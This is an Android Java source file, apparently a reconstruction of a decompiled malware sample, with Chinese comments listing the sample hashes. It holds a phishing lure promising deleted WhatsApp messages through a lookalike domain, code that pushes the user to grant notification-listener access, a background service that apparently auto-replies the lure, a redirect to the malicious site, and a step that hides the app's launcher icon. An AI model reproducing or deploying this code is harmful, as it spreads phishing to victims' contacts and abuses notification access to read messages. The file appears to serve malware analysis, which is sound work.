package com.example.autoreply;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Toast;

/*
    最初发现样本：121AB9F7C0F439274478099D9E550473
    反编译样本：168f44d161059f83c16cd6088ede0c48
 */
public class MainActivity extends AppCompatActivity {

    public static String message = "*Now You can Read deleted whatsapp Messages* 👌😉 --->>  http://whatsapp.com.xx1.pw/?";

    /* access modifiers changed from: protected */
    @Override // androidx.core.app.ComponentActivity, androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        ComponentName componentName = new ComponentName(getApplicationContext(), NotificationService.class);
        String string = Settings.Secure.getString(getApplicationContext().getContentResolver(), "enabled_notification_listeners");
        if (string != null && string.contains(componentName.flattenToString())) {
            startService();
        }
        findViewById(R.id.notification).setOnClickListener(new View.OnClickListener() {
            /* class com.respondernew.my.MainActivity.AnonymousClass1 */

            public void onClick(View view) {
                MainActivity.this.startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
            }
        });
    }

    /* access modifiers changed from: package-private */
    public void startService() {
        startService(new Intent(this, NotificationService.class));
        Toast.makeText(getApplicationContext(), "Final Step...", 0).show();
        Intent intent = new Intent("android.intent.action.VIEW", Uri.parse("googlechrome://navigate?url=" + "http://xx1.pw"));
        intent.addFlags(268435456);
        startActivity(intent);
        finish();
        getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class), 2, 1);
    }

    /* access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity
    public void onResume() {
        ComponentName componentName = new ComponentName(getApplicationContext(), NotificationService.class);
        String string = Settings.Secure.getString(getApplicationContext().getContentResolver(), "enabled_notification_listeners");
        if (string != null && string.contains(componentName.flattenToString())) {
            startService();
        }
        super.onResume();
    }

}